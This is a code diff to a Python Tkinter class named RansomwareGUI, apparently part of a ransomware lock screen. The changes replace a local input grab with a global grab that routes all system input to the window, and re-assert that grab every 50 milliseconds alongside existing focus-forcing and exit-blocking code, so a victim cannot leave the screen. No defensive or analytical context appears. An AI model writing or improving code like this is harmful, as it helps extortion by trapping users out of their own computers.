@@ -216,7 +216,13 @@ class RansomwareGUI:
         master.resizable(False, False)
         
         # Input Grabbing (The "Lock")
-        master.grab_set() # Steal all events
+        # Global grab for Linux: grab_set_global routes all system input to this window
+        master.wait_visibility(master) # Ensure window is visible before grabbing
+        try:
+            master.grab_set_global()
+        except:
+            master.grab_set() # Fallback to local grab
+            
         master.focus_force() 
         
         # Bindings to block exit
@@ -275,7 +281,11 @@ class RansomwareGUI:
             self.master.lift()
             self.master.attributes('-topmost', True)
             self.master.focus_force()
-            self.master.grab_set() # Re-grab if lost
+            # Re-assert global grab periodically
+            try:
+                self.master.grab_set_global()
+            except:
+                self.master.grab_set()
         except:
             pass
         self.master.after(50, self.force_focus_loop) # Check every 50ms
